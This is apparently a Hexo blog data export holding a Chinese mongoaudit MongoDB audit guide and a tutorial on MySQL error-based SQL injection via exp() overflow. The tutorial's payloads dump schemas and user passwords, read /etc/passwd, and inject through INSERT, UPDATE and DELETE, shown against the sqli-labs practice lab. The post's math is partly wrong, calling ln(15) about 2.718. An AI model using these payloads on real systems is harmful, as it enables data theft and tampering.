class=\"line\">或如下安装</span><br><span class=\"line\">curl -s https://mongoaud.it/install | bash</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/mongodb/image-20200929211504801.png\" alt=\"image-20200929211504801\"></p>\n<h4 id=\"Docker-install-mongodb\"><a href=\"#Docker-install-mongodb\" class=\"headerlink\" title=\"Docker install mongodb\"></a>Docker install mongodb</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 拉取镜像</span></span><br><span class=\"line\">docker pull mongo</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 运行并授权访问mongodb</span></span><br><span class=\"line\">docker run -itd --name mongo -p 27017:27017 mongo --auth</span><br><span class=\"line\">docker exec -it mongo mongo admin</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 创建一个名为 admin，密码为 123456 的用户。</span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db.createUser(&#123; user:<span class=\"string\">&#x27;admin&#x27;</span>,<span class=\"built_in\">pwd</span>:<span class=\"string\">&#x27;123456&#x27;</span>,roles:[ &#123; role:<span class=\"string\">&#x27;userAdminAnyDatabase&#x27;</span>, db: <span class=\"string\">&#x27;admin&#x27;</span>&#125;,<span class=\"string\">&quot;readWriteAnyDatabase&quot;</span>]&#125;);</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 设置密码</span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db.auth(<span class=\"string\">&#x27;admin&#x27;</span>, <span class=\"string\">&#x27;123456&#x27;</span>)</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h4><p>1、安装无报错即可执行“<code>mongoaudit</code>”</p>\n<p><img src=\"/images/mongodb/image-20200930103553876.png\" alt=\"image-20200930103553876\"></p>\n<p>2、点击“OK，I’ll be careful”</p>\n<p><img src=\"/images/mongodb/image-20200930111959162.png\" alt=\"image-20200930111959162\"></p>\n<center>Mongoaudit scan types</center>\n3、输入域名信息\n\n<p><img src=\"/images/mongodb/image-20200930112054225.png\" alt=\"image-20200930112054225\"></p>\n<p>4、输入域名及密码进行安全检查</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mongodb://admin:123456@192.168.3.77:27017/database</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/mongodb/image-20200930115800598.png\" alt=\"image-20200930115800598\"></p>\n<p>5、检查结果</p>\n<p><img src=\"/images/mongodb/image-20200930115946711.png\" alt=\"image-20200930115946711\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h4><p>强大的 MongoDB 审计和渗透性测试（pentesting）工具。用于审计 MongoDB 服务器，检测不良安全设置和执行自动渗透测试。</p>\n<p>MongonDB配置安全检查工具</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;stampery&#x2F;mongoaudit</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Install\"><a href=\"#Install\" class=\"headerlink\" title=\"Install\"></a>Install</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install mongoaudit</span><br><span class=\"line\">或如下安装</span><br><span class=\"line\">curl -s https://mongoaud.it/install | bash</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/mongodb/image-20200929211504801.png\" alt=\"image-20200929211504801\"></p>\n<h4 id=\"Docker-install-mongodb\"><a href=\"#Docker-install-mongodb\" class=\"headerlink\" title=\"Docker install mongodb\"></a>Docker install mongodb</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 拉取镜像</span></span><br><span class=\"line\">docker pull mongo</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 运行并授权访问mongodb</span></span><br><span class=\"line\">docker run -itd --name mongo -p 27017:27017 mongo --auth</span><br><span class=\"line\">docker exec -it mongo mongo admin</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 创建一个名为 admin，密码为 123456 的用户。</span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db.createUser(&#123; user:<span class=\"string\">&#x27;admin&#x27;</span>,<span class=\"built_in\">pwd</span>:<span class=\"string\">&#x27;123456&#x27;</span>,roles:[ &#123; role:<span class=\"string\">&#x27;userAdminAnyDatabase&#x27;</span>, db: <span class=\"string\">&#x27;admin&#x27;</span>&#125;,<span class=\"string\">&quot;readWriteAnyDatabase&quot;</span>]&#125;);</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 设置密码</span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> db.auth(<span class=\"string\">&#x27;admin&#x27;</span>, <span class=\"string\">&#x27;123456&#x27;</span>)</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h4><p>1、安装无报错即可执行“<code>mongoaudit</code>”</p>\n<p><img src=\"/images/mongodb/image-20200930103553876.png\" alt=\"image-20200930103553876\"></p>\n<p>2、点击“OK，I’ll be careful”</p>\n<p><img src=\"/images/mongodb/image-20200930111959162.png\" alt=\"image-20200930111959162\"></p>\n<center>Mongoaudit scan types</center>\n3、输入域名信息\n\n<p><img src=\"/images/mongodb/image-20200930112054225.png\" alt=\"image-20200930112054225\"></p>\n<p>4、输入域名及密码进行安全检查</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mongodb://admin:123456@192.168.3.77:27017/database</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/mongodb/image-20200930115800598.png\" alt=\"image-20200930115800598\"></p>\n<p>5、检查结果</p>\n<p><img src=\"/images/mongodb/image-20200930115946711.png\" alt=\"image-20200930115946711\"></p>\n"},{"title":"Mysql注入之EXP报错","date":"2019-03-08T00:38:41.000Z","_content":"作者在MySQL中发现了一个Double型数据溢出。如果你想了解利用溢出来注出数据，当我们拿到MySQL里的函数时，作者比较感兴趣的是其中的数学函数，它们也应该包含一些数据类型来保存数值。所以作者就跑去测试看哪些函数会出现溢出错误。然后作者发现，当传递一个大于709的值时，函数exp()就会引起一个溢出错误.\n\n## 一、函数介绍\n\nEXP(x) 返回值e(自然对数的底)的x次方\n\n![](/images/sql-exp/exp1.png)\n\n分析: E ≈ 2.7182818284 5904523536 0287471352 6624977572 4709369995\n\n![](/images/sql-exp/exp2.png)\n\n在MySQL中,exp与ln和log的功能相反,简单介绍下,就是log和ln都返回以e为底数的对数.\n\nln(15)=loge(15)≈ 2.7182818284\n\n![](/images/sql-exp/exp3.png)\n\n指数函数为对数函数的反函数,exp()即为以e为底的对数函数，如等式:\n\n![](/images/sql-exp/exp4.png)\n\n## 二、注入\n\n当涉及到注入时，我们使用否定查询来造成“DOUBLE value is out of range”的错误。作者之前的博文提到的，将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值.\n\n![](/images/sql-exp/exp5.png)\n\n我们通过子查询与按位求反,造成一个DOUBLE overflow error,并借由此注出数据.\n结合:\nexp(~(select*from(select user())x));\n最新版本mysql数据库无法实现报错;\n\n![](/images/sql-exp/exp6.png)\n\n5.5.42版本数据库可以实现报错;\n\n![](/images/sql-exp/exp7.png)\n\n## 三、注入数据\n\n既然通过以上姿势可以报错显示部分信息,那么下面我们就可以爆出表、字段数据等;\n\n### 3.1.爆表\n\n```sql\nSQL:\nselect exp(~(select*from(select table_name from information_schema.tables where table_schema='security' limit 0,1)x));\n```\n\n![](/images/sql-exp/exp8.png)\n\n### 3.2.爆字段\n\n```sql\nSQL:\nselect exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));\n```\n\n![](/images/sql-exp/exp9.png)\n\n### 3.3.爆数据\n\n```sql\nSQL:\nselect exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));\n```\n\n![](/images/sql-exp/exp10.png)\n\n## 四、Dump表、字段数据\n\n这个查询可以从当前的上下文中dump出所有的tables与columns.我们也可以dump出所有的数据库,但由于我们是通过一个错误进行提取,它会返回很少的结果.\n\n```sql\nSQL:\nselect exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where\ntable_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))\n```\n\n![](/images/sql-exp/exp11.png)\n\nDEMO:\n\n```sql\nURL:\nhttp://sqli-labs.me:8888/Less-5/?id=1' or exp(~(select*from(select(concat(@:=0,(select count(*)from\ninformation_schema.columns where\ntable_schema='security'and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))--+\n```\n\n![](/images/sql-exp/exp12.png)\n\n## 五、文件读取\n\n你可以通过load_file()函数来读取文件,但作者发现有13行的限制,该语句也可以在BIGINT overflow injections中使用.\nselect exp(~(select*from(select load_file('/etc/passwd'))a));\n数据库版本：5.5.42\n\n![](/images/sql-exp/exp13.png)\n\n数据库版本：5.5.58 已经无法实现报错;\n\n![](/images/sql-exp/exp14.png)\n\n## 六、插入、更新、删除\n\n与插入数据格式一致\n\n```sql\nSQL:\nmysql> insert into users (id, username, password) values (2, '' ^ exp(~(select*from(select user())x)), 'test');\n```\n\n![](/images/sql-exp/exp15.png)\n\n```sql\nSQL:\nmysql> insert into users (id, username, password) values (2, '' | exp(~(select*from(select(concat(@:=0,(select\ncount(*)from`information_schema`.columns where\ntable_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)), 'Eyre');\n```\n\n![](/images/sql-exp/exp16.png)\n\n```sql\nupdate:\nmysql> update users set password='test' ^ exp(~(select*from(select user())x)) where id=4;\n```\n\n![](/images/sql-exp/exp17.png)\n\n```sql\ndelete:\nmysql> delete from users where id='1' | exp(~(select*from(select user())x));\n```\n\n![](/images/sql-exp/exp18.png)\n\n### 参考\n\n```sql\nhttps://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/\nhttps://packetstormsecurity.com/files/133256/MySQL-Error-Based-SQL-Injection-Using-EXP.html\n```\n\n","source":"_posts/Mysql注入之EXP报错.md","raw":"---\ntitle: Mysql注入之EXP报错\ndate: 2019-03-08 08:38:41\ntags:\n - 注入\n---\n作者在MySQL中发现了一个Double型数据溢出。如果你想了解利用溢出来注出数据，当我们拿到MySQL里的函数时，作者比较感兴趣的是其中的数学函数，它们也应该包含一些数据类型来保存数值。所以作者就跑去测试看哪些函数会出现溢出错误。然后作者发现，当传递一个大于709的值时，函数exp()就会引起一个溢出错误.\n\n## 一、函数介绍\n\nEXP(x) 返回值e(自然对数的底)的x次方\n\n![](/images/sql-exp/exp1.png)\n\n分析: E ≈ 2.7182818284 5904523536 0287471352 6624977572 4709369995\n\n![](/images/sql-exp/exp2.png)\n\n在MySQL中,exp与ln和log的功能相反,简单介绍下,就是log和ln都返回以e为底数的对数.\n\nln(15)=loge(15)≈ 2.7182818284\n\n![](/images/sql-exp/exp3.png)\n\n指数函数为对数函数的反函数,exp()即为以e为底的对数函数，如等式:\n\n![](/images/sql-exp/exp4.png)\n\n## 二、注入\n\n当涉及到注入时，我们使用否定查询来造成“DOUBLE value is out of range”的错误。作者之前的博文提到的，将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值.\n\n![](/images/sql-exp/exp5.png)\n\n我们通过子查询与按位求反,造成一个DOUBLE overflow error,并借由此注出数据.\n结合:\nexp(~(select*from(select user())x));\n最新版本mysql数据库无法实现报错;\n\n![](/images/sql-exp/exp6.png)\n\n5.5.42版本数据库可以实现报错;\n\n![](/images/sql-exp/exp7.png)\n\n## 三、注入数据\n\n既然通过以上姿势可以报错显示部分信息,那么下面我们就可以爆出表、字段数据等;\n\n### 3.1.爆表\n\n```sql\nSQL:\nselect exp(~(select*from(select table_name from information_schema.tables where table_schema='security' limit 0,1)x));\n```\n\n![](/images/sql-exp/exp8.png)\n\n### 3.2.爆字段\n\n```sql\nSQL:\nselect exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));\n```\n\n![](/images/sql-exp/exp9.png)\n\n### 3.3.爆数据\n\n```sql\nSQL:\nselect exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));\n```\n\n![](/images/sql-exp/exp10.png)\n\n## 四、Dump表、字段数据\n\n这个查询可以从当前的上下文中dump出所有的tables与columns.我们也可以dump出所有的数据库,但由于我们是通过一个错误进行提取,它会返回很少的结果.\n\n```sql\nSQL:\nselect exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where\ntable_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))\n```\n\n![](/images/sql-exp/exp11.png)\n\nDEMO:\n\n```sql\nURL:\nhttp://sqli-labs.me:8888/Less-5/?id=1' or exp(~(select*from(select(concat(@:=0,(select count(*)from\ninformation_schema.columns where\ntable_schema='security'and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))--+\n```\n\n![](/images/sql-exp/exp12.png)\n\n## 五、文件读取\n\n你可以通过load_file()函数来读取文件,但作者发现有13行的限制,该语句也可以在BIGINT overflow injections中使用.\nselect exp(~(select*from(select load_file('/etc/passwd'))a));\n数据库版本：5.5.42\n\n![](/images/sql-exp/exp13.png)\n\n数据库版本：5.5.58 已经无法实现报错;\n\n![](/images/sql-exp/exp14.png)\n\n## 六、插入、更新、删除\n\n与插入数据格式一致\n\n```sql\nSQL:\nmysql> insert into users (id, username, password) values (2, '' ^ exp(~(select*from(select user())x)), 'test');\n```\n\n![](/images/sql-exp/exp15.png)\n\n```sql\nSQL:\nmysql> insert into users (id, username, password) values (2, '' | exp(~(select*from(select(concat(@:=0,(select\ncount(*)from`information_schema`.columns where\ntable_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)), 'Eyre');\n```\n\n![](/images/sql-exp/exp16.png)\n\n```sql\nupdate:\nmysql> update users set password='test' ^ exp(~(select*from(select user())x)) where id=4;\n```\n\n![](/images/sql-exp/exp17.png)\n\n```sql\ndelete:\nmysql> delete from users where id='1' | exp(~(select*from(select user())x));\n```\n\n![](/images/sql-exp/exp18.png)\n\n### 参考\n\n```sql\nhttps://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/\nhttps://packetstormsecurity.com/files/133256/MySQL-Error-Based-SQL-Injection-Using-EXP.html\n```\n\n","slug":"Mysql注入之EXP报错","published":1,"updated":"2020-10-23T03:37:02.508Z","_id":"ckglobhdm000db1hq7yo91abe","comments":1,"layout":"post","photos":[],"link":"","content":"<p>作者在MySQL中发现了一个Double型数据溢出。如果你想了解利用溢出来注出数据，当我们拿到MySQL里的函数时，作者比较感兴趣的是其中的数学函数，它们也应该包含一些数据类型来保存数值。所以作者就跑去测试看哪些函数会出现溢出错误。然后作者发现，当传递一个大于709的值时，函数exp()就会引起一个溢出错误.</p>\n<h2 id=\"一、函数介绍\"><a href=\"#一、函数介绍\" class=\"headerlink\" title=\"一、函数介绍\"></a>一、函数介绍</h2><p>EXP(x) 返回值e(自然对数的底)的x次方</p>\n<p><img src=\"/images/sql-exp/exp1.png\"></p>\n<p>分析: E ≈ 2.7182818284 5904523536 0287471352 6624977572 4709369995</p>\n<p><img src=\"/images/sql-exp/exp2.png\"></p>\n<p>在MySQL中,exp与ln和log的功能相反,简单介绍下,就是log和ln都返回以e为底数的对数.</p>\n<p>ln(15)=loge(15)≈ 2.7182818284</p>\n<p><img src=\"/images/sql-exp/exp3.png\"></p>\n<p>指数函数为对数函数的反函数,exp()即为以e为底的对数函数，如等式:</p>\n<p><img src=\"/images/sql-exp/exp4.png\"></p>\n<h2 id=\"二、注入\"><a href=\"#二、注入\" class=\"headerlink\" title=\"二、注入\"></a>二、注入</h2><p>当涉及到注入时，我们使用否定查询来造成“DOUBLE value is out of range”的错误。作者之前的博文提到的，将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值.</p>\n<p><img src=\"/images/sql-exp/exp5.png\"></p>\n<p>我们通过子查询与按位求反,造成一个DOUBLE overflow error,并借由此注出数据.<br>结合:<br>exp(~(select*from(select user())x));<br>最新版本mysql数据库无法实现报错;</p>\n<p><img src=\"/images/sql-exp/exp6.png\"></p>\n<p>5.5.42版本数据库可以实现报错;</p>\n<p><img src=\"/images/sql-exp/exp7.png\"></p>\n<h2 id=\"三、注入数据\"><a href=\"#三、注入数据\" class=\"headerlink\" title=\"三、注入数据\"></a>三、注入数据</h2><p>既然通过以上姿势可以报错显示部分信息,那么下面我们就可以爆出表、字段数据等;</p>\n<h3 id=\"3-1-爆表\"><a href=\"#3-1-爆表\" class=\"headerlink\" title=\"3.1.爆表\"></a>3.1.爆表</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL:</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">exp</span>(~(<span class=\"keyword\">select</span>*<span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> table_name <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema=<span class=\"string\">&#x27;security&#x27;</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>)x));</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp8.png\"></p>\n<h3 id=\"3-2-爆字段\"><a href=\"#3-2-爆字段\" class=\"headerlink\" title=\"3.2.爆字段\"></a>3.2.爆字段</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL:</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">exp</span>(~(<span class=\"keyword\">select</span>*<span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> column_name <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_name=<span class=\"string\">&#x27;users&#x27;</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>)x));</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp9.png\"></p>\n<h3 id=\"3-3-爆数据\"><a href=\"#3-3-爆数据\" class=\"headerlink\" title=\"3.3.爆数据\"></a>3.3.爆数据</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL:</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">exp</span>(~ (<span class=\"keyword\">select</span>*<span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> <span class=\"keyword\">concat_ws</span>(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"keyword\">id</span>, username, <span class=\"keyword\">password</span>) <span class=\"keyword\">from</span> <span class=\"keyword\">users</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>)x));</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp10.png\"></p>\n<h2 id=\"四、Dump表、字段数据\"><a href=\"#四、Dump表、字段数据\" class=\"headerlink\" title=\"四、Dump表、字段数据\"></a>四、Dump表、字段数据</h2><p>这个查询可以从当前的上下文中dump出所有的tables与columns.我们也可以dump出所有的数据库,但由于我们是通过一个错误进行提取,它会返回很少的结果.</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL:</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">exp</span>(~(<span class=\"keyword\">select</span>*<span class=\"keyword\">from</span>(<span class=\"keyword\">select</span>(<span class=\"keyword\">concat</span>(@:=<span class=\"number\">0</span>,(<span class=\"keyword\">select</span> <span class=\"keyword\">count</span>(*)<span class=\"keyword\">from</span><span class=\"string\">`information_schema`</span>.columns <span class=\"keyword\">where</span></span><br><span class=\"line\">table_schema=<span class=\"keyword\">database</span>()<span class=\"keyword\">and</span>@:=<span class=\"keyword\">concat</span>(@,<span class=\"number\">0xa</span>,table_schema,<span class=\"number\">0x3a3a</span>,table_name,<span class=\"number\">0x3a3a</span>,column_name)),@)))x))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp11.png\"></p>\n<p>DEMO:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1&#x27; or exp(~(<span class=\"keyword\">select</span>*<span class=\"keyword\">from</span>(<span class=\"keyword\">select</span>(<span class=\"keyword\">concat</span>(@:=<span class=\"number\">0</span>,(<span class=\"keyword\">select</span> <span class=\"keyword\">count</span>(*)<span class=\"keyword\">from</span></span><br><span class=\"line\">information_schema.columns <span class=\"keyword\">where</span></span><br><span class=\"line\">table_schema=<span class=\"string\">&#x27;security&#x27;</span><span class=\"keyword\">and</span>@:=<span class=\"keyword\">concat</span>(@,<span class=\"number\">0xa</span>,table_schema,<span class=\"number\">0x3a3a</span>,table_name,<span class=\"number\">0x3a3a</span>,column_name)),@)))x))<span class=\"comment\">--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp12.png\"></p>\n<h2 id=\"五、文件读取\"><a href=\"#五、文件读取\" class=\"headerlink\" title=\"五、文件读取\"></a>五、文件读取</h2><p>你可以通过load_file()函数来读取文件,但作者发现有13行的限制,该语句也可以在BIGINT overflow injections中使用.<br>select exp(~(select*from(select load_file(‘/etc/passwd’))a));<br>数据库版本：5.5.42</p>\n<p><img src=\"/images/sql-exp/exp13.png\"></p>\n<p>数据库版本：5.5.58 已经无法实现报错;</p>\n<p><img src=\"/images/sql-exp/exp14.png\"></p>\n<h2 id=\"六、插入、更新、删除\"><a href=\"#六、插入、更新、删除\" class=\"headerlink\" title=\"六、插入、更新、删除\"></a>六、插入、更新、删除</h2><p>与插入数据格式一致</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL:</span><br><span class=\"line\">mysql&gt; insert into users (id, username, password) values (2, &#x27;&#x27; ^ exp(~(select*from(select user())x)), &#x27;test&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp15.png\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL:</span><br><span class=\"line\">mysql&gt; insert into users (id, username, password) values (2, &#x27;&#x27; | exp(~(select*from(select(concat(@:=0,(select</span><br><span class=\"line\">count(*)from`information_schema`.columns where</span><br><span class=\"line\">table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)), &#x27;Eyre&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp16.png\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">update</span>:</span><br><span class=\"line\">mysql&gt; <span class=\"keyword\">update</span> <span class=\"keyword\">users</span> <span class=\"keyword\">set</span> <span class=\"keyword\">password</span>=<span class=\"string\">&#x27;test&#x27;</span> ^ <span class=\"keyword\">exp</span>(~(<span class=\"keyword\">select</span>*<span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>())x)) <span class=\"keyword\">where</span> <span class=\"keyword\">id</span>=<span class=\"number\">4</span>;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp17.png\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">delete</span>:</span><br><span class=\"line\">mysql&gt; <span class=\"keyword\">delete</span> <span class=\"keyword\">from</span> <span class=\"keyword\">users</span> <span class=\"keyword\">where</span> <span class=\"keyword\">id</span>=<span class=\"string\">&#x27;1&#x27;</span> | <span class=\"keyword\">exp</span>(~(<span class=\"keyword\">select</span>*<span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>())x));</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp18.png\"></p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/</span><br><span class=\"line\">https://packetstormsecurity.com/files/133256/MySQL-Error-Based-SQL-Injection-Using-EXP.html</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p>作者在MySQL中发现了一个Double型数据溢出。如果你想了解利用溢出来注出数据，当我们拿到MySQL里的函数时，作者比较感兴趣的是其中的数学函数，它们也应该包含一些数据类型来保存数值。所以作者就跑去测试看哪些函数会出现溢出错误。然后作者发现，当传递一个大于709的值时，函数exp()就会引起一个溢出错误.</p>\n<h2 id=\"一、函数介绍\"><a href=\"#一、函数介绍\" class=\"headerlink\" title=\"一、函数介绍\"></a>一、函数介绍</h2><p>EXP(x) 返回值e(自然对数的底)的x次方</p>\n<p><img src=\"/images/sql-exp/exp1.png\"></p>\n<p>分析: E ≈ 2.7182818284 5904523536 0287471352 6624977572 4709369995</p>\n<p><img src=\"/images/sql-exp/exp2.png\"></p>\n<p>在MySQL中,exp与ln和log的功能相反,简单介绍下,就是log和ln都返回以e为底数的对数.</p>\n<p>ln(15)=loge(15)≈ 2.7182818284</p>\n<p><img src=\"/images/sql-exp/exp3.png\"></p>\n<p>指数函数为对数函数的反函数,exp()即为以e为底的对数函数，如等式:</p>\n<p><img src=\"/images/sql-exp/exp4.png\"></p>\n<h2 id=\"二、注入\"><a href=\"#二、注入\" class=\"headerlink\" title=\"二、注入\"></a>二、注入</h2><p>当涉及到注入时，我们使用否定查询来造成“DOUBLE value is out of range”的错误。作者之前的博文提到的，将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值.</p>\n<p><img src=\"/images/sql-exp/exp5.png\"></p>\n<p>我们通过子查询与按位求反,造成一个DOUBLE overflow error,并借由此注出数据.<br>结合:<br>exp(~(select*from(select user())x));<br>最新版本mysql数据库无法实现报错;</p>\n<p><img src=\"/images/sql-exp/exp6.png\"></p>\n<p>5.5.42版本数据库可以实现报错;</p>\n<p><img src=\"/images/sql-exp/exp7.png\"></p>\n<h2 id=\"三、注入数据\"><a href=\"#三、注入数据\" class=\"headerlink\" title=\"三、注入数据\"></a>三、注入数据</h2><p>既然通过以上姿势可以报错显示部分信息,那么下面我们就可以爆出表、字段数据等;</p>\n<h3 id=\"3-1-爆表\"><a href=\"#3-1-爆表\" class=\"headerlink\" title=\"3.1.爆表\"></a>3.1.爆表</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL:</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">exp</span>(~(<span class=\"keyword\">select</span>*<span class=\"keyword\">from</span>(<span class=\"keyword\">select</span> table_name <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema=<span class=\"string\">&#x27;security&#x27;</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>)x));</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sql-exp/exp8.png\"></p>\n<h3 